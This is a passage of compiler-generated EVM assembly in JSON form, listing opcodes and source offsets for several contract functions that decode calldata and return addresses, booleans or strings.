											"name": "PUSH [tag]",
											"value": "84"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "84"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "POP"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "PUSH [tag]",
											"value": "85"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "DUP1"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "86"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "86"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "DUP2"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "ADD"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "SWAP1"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "DUP1"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "DUP1"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "AND"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "SWAP1"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "ADD"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "SWAP1"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "SWAP3"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "SWAP2"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "SWAP1"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "POP"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "POP"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "POP"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "PUSH [tag]",
											"value": "87"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "tag",
											"value": "85"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "JUMPDEST"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "MLOAD"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "DUP1"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "DUP3"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "DUP2"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "MSTORE"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "ADD"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "SWAP2"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "POP"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "POP"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "MLOAD"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "DUP1"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "SWAP2"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "SUB"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "SWAP1"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "RETURN"
										},
										{
											"begin": 1446,
											"end": 1586,
											"name": "tag",
											"value": "15"
										},
										{
											"begin": 1446,
											"end": 1586,
											"name": "JUMPDEST"
										},
										{
											"begin": 1446,
											"end": 1586,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "88"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "88"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 1446,
											"end": 1586,
											"name": "POP"
										},
										{
											"begin": 1446,
											"end": 1586,
											"name": "PUSH [tag]",
											"value": "89"
										},
										{
											"begin": 1446,
											"end": 1586,
											"name": "PUSH [tag]",
											"value": "90"
										},
										{
											"begin": 1446,
											"end": 1586,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 1446,
											"end": 1586,
											"name": "tag",
											"value": "89"
										},
										{
											"begin": 1446,
											"end": 1586,
											"name": "JUMPDEST"
										},
										{
											"begin": 1446,
											"end": 1586,
											"name": "STOP"
										},
										{
											"begin": 806,
											"end": 885,
											"name": "tag",
											"value": "16"
										},
										{
											"begin": 806,
											"end": 885,
											"name": "JUMPDEST"
										},
										{
											"begin": 806,
											"end": 885,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "91"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "91"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 806,
											"end": 885,
											"name": "POP"
										},
										{
											"begin": 806,
											"end": 885,
											"name": "PUSH [tag]",
											"value": "92"
										},
										{
											"begin": 806,
											"end": 885,
											"name": "PUSH [tag]",
											"value": "93"
										},
										{
											"begin": 806,
											"end": 885,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 806,
											"end": 885,
											"name": "tag",
											"value": "92"
										},
										{
											"begin": 806,
											"end": 885,
											"name": "JUMPDEST"
										},
										{
											"begin": 806,
											"end": 885,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 806,
											"end": 885,
											"name": "MLOAD"
										},
										{
											"begin": 806,
											"end": 885,
											"name": "DUP1"
										},
										{
											"begin": 806,
											"end": 885,
											"name": "DUP3"
										},
										{
											"begin": 806,
											"end": 885,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 806,
											"end": 885,
											"name": "AND"
										},
										{
											"begin": 806,
											"end": 885,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 806,
											"end": 885,
											"name": "AND"
										},
										{
											"begin": 806,
											"end": 885,
											"name": "DUP2"
										},
										{
											"begin": 806,
											"end": 885,
											"name": "MSTORE"
										},
										{
											"begin": 806,
											"end": 885,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 806,
											"end": 885,
											"name": "ADD"
										},
										{
											"begin": 806,
											"end": 885,
											"name": "SWAP2"
										},
										{
											"begin": 806,
											"end": 885,
											"name": "POP"
										},
										{
											"begin": 806,
											"end": 885,
											"name": "POP"
										},
										{
											"begin": 806,
											"end": 885,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 806,
											"end": 885,
											"name": "MLOAD"
										},
										{
											"begin": 806,
											"end": 885,
											"name": "DUP1"
										},
										{
											"begin": 806,
											"end": 885,
											"name": "SWAP2"
										},
										{
											"begin": 806,
											"end": 885,
											"name": "SUB"
										},
										{
											"begin": 806,
											"end": 885,
											"name": "SWAP1"
										},
										{
											"begin": 806,
											"end": 885,
											"name": "RETURN"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "tag",
											"value": "17"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "JUMPDEST"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "94"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "94"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "POP"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "PUSH [tag]",
											"value": "95"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "PUSH [tag]",
											"value": "96"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "tag",
											"value": "95"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "JUMPDEST"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "MLOAD"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "DUP1"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "DUP1"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "ADD"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "DUP3"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "DUP2"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "SUB"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "DUP3"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "MSTORE"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "DUP4"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "DUP2"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "DUP2"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "MLOAD"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "DUP2"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "MSTORE"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "ADD"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "SWAP2"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "POP"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "DUP1"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "MLOAD"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "SWAP1"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "ADD"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "SWAP1"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "DUP1"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "DUP4"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "DUP4"
										},
										{
											"begin": 23,
											"end": 24,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "tag",
											"value": "97"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPDEST"
										},
										{
											"begin": 33,
											"end": 36,
											"name": "DUP4"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "DUP2"
										},
										{
											"begin": 27,
											"end": 37,
											"name": "LT"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "PUSH [tag]",
											"value": "99"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPI"
										},
										{
											"begin": 99,
											"end": 100,
											"name": "DUP1"
										},
										{
											"begin": 94,
											"end": 97,
											"name": "DUP3"
										},
										{
											"begin": 90,
											"end": 101,
											"name": "ADD"
										},
										{
											"begin": 84,
											"end": 102,
											"name": "MLOAD"
										},
										{
											"begin": 80,
											"end": 81,
											"name": "DUP2"
										},
										{
											"begin": 75,
											"end": 78,
											"name": "DUP5"
										},
										{
											"begin": 71,
											"end": 82,
											"name": "ADD"
										},
										{
											"begin": 64,
											"end": 103,
											"name": "MSTORE"
										},
										{
											"begin": 52,
											"end": 54,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 49,
											"end": 50,
											"name": "DUP2"
										},
										{
											"begin": 45,
											"end": 55,
											"name": "ADD"
										},
										{
											"begin": 40,
											"end": 55,
											"name": "SWAP1"
										},
										{
											"begin": 40,
											"end": 55,
											"name": "POP"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "PUSH [tag]",
											"value": "97"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMP"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "tag",
											"value": "99"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPDEST"
										},
										{
											"begin": 12,
											"end": 26,
											"name": "POP"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "POP"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "POP"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "POP"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "SWAP1"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "POP"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "SWAP1"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "DUP2"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "ADD"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "SWAP1"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "AND"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "DUP1"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "ISZERO"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "PUSH [tag]",
											"value": "100"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "JUMPI"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "DUP1"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "DUP3"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "SUB"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "DUP1"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "MLOAD"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "DUP4"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "SUB"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "EXP"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "SUB"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "NOT"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "AND"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "DUP2"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "MSTORE"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "ADD"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "SWAP2"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "POP"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "tag",
											"value": "100"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "JUMPDEST"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "POP"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "SWAP3"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "POP"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "POP"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "POP"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "MLOAD"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "DUP1"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "SWAP2"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "SUB"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "SWAP1"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "RETURN"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "tag",
											"value": "18"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "JUMPDEST"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "101"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "101"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "POP"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "PUSH [tag]",
											"value": "102"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "DUP1"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "103"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "103"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "DUP2"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "ADD"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "SWAP1"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "DUP1"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "DUP1"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "AND"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "SWAP1"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "ADD"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "SWAP1"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "SWAP3"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "SWAP2"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "SWAP1"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "POP"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "POP"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "POP"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "PUSH [tag]",
											"value": "104"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "tag",
											"value": "102"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "JUMPDEST"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "MLOAD"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "DUP1"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "DUP3"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "ISZERO"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "ISZERO"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "ISZERO"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "ISZERO"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "DUP2"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "MSTORE"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "ADD"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "SWAP2"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "POP"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "POP"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "MLOAD"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "DUP1"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "SWAP2"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "SUB"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "SWAP1"
										},
										{
											"begin": 2831,
											"end": 2930,
											"name": "RETURN"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "tag",
											"value": "19"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "JUMPDEST"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "105"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "105"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "POP"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "PUSH [tag]",
											"value": "106"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "DUP1"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "107"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "107"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "DUP2"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "ADD"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "SWAP1"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "DUP1"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "DUP1"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "AND"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "SWAP1"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "ADD"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "SWAP1"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "SWAP3"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "SWAP2"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "SWAP1"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "DUP1"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "SWAP1"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "ADD"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "SWAP1"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "SWAP3"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "SWAP2"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "SWAP1"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "POP"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "POP"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "POP"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "PUSH [tag]",
											"value": "108"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "tag",
											"value": "106"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "JUMPDEST"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "MLOAD"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "DUP1"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "DUP3"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "ISZERO"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "ISZERO"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "ISZERO"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "ISZERO"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "DUP2"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "MSTORE"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "ADD"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "SWAP2"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "POP"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "POP"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "MLOAD"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "DUP1"
